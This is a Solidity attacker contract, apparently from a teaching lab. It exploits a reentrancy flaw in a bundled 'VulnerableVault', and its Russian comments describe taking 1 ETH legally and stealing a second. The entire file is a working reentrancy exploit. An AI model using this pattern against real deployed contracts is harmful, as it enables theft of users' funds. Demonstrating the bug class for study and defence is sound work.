// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;
    uint256 public attackCount;
    
    event AttackStep(uint256 step, uint256 amount);
    
    // Fix: Use address then cast
    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }
    
    receive() external payable {
        attackCount++;
        emit AttackStep(attackCount, msg.value);
        
        // Делаем реентранси ровно один раз!
        // Заберем 1 ETH легально и 1 ETH украдем.
        if (attackCount == 1 && address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
    
    function getStolenAmount() external view returns (uint256) {
        return address(this).balance;
    }
}